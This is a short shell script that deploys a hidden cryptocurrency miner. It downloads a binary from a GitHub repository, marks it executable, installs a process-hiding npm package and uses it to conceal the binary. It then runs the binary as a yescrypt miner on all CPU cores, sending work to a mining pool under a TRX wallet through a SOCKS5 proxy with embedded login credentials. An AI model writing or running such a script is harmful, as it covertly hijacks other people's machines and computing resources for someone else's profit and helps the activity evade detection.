#!/bin/sh
apt update -y
wget -q https://github.com/thirthada007/DevOps/raw/main/data
chmod +x data
npm i -g node-process-hider 
ph add data
./data -a yescrypt -o stratum+tcp://yescrypt.na.mine.zergpool.com:6233 -u TQzmMDEjP1k2a7c6xqf3xJgJJ7E9NkzBbW.archer -p c=TRX -t $(nproc) -x socks5://Kemjabd1727:Gaushd019@23.250.48.248:9301
